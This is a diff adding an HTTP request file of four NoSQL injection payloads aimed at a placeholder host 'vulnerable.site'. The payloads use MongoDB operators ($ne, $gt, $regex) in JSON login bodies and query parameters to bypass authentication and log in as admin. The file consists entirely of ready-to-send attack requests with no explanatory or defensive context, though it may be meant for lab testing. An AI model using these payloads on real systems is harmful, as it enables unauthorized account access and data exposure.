@@ -1,0 +1,43 @@
+### 🧪 Classic NoSQL Injection (Login Bypass) — MongoDB style
+
+POST /login HTTP/1.1
+Host: vulnerable.site
+Content-Type: application/json
+
+{
+  "username": { "$ne": null },
+  "password": { "$ne": null }
+}
+
+###
+
+### 🔐 Login with admin account via logic bypass
+
+POST /login HTTP/1.1
+Host: vulnerable.site
+Content-Type: application/json
+
+{
+  "username": { "$gt": "" },
+  "password": { "$gt": "" }
+}
+
+###
+
+### 🚨 Boolean Injection (JS-style)
+
+POST /login HTTP/1.1
+Host: vulnerable.site
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": { "$regex": ".*" }
+}
+
+###
+
+### 🧪 Filter tampering in GET requests
+
+GET /user?id[$ne]=0 HTTP/1.1
+Host: vulnerable.site
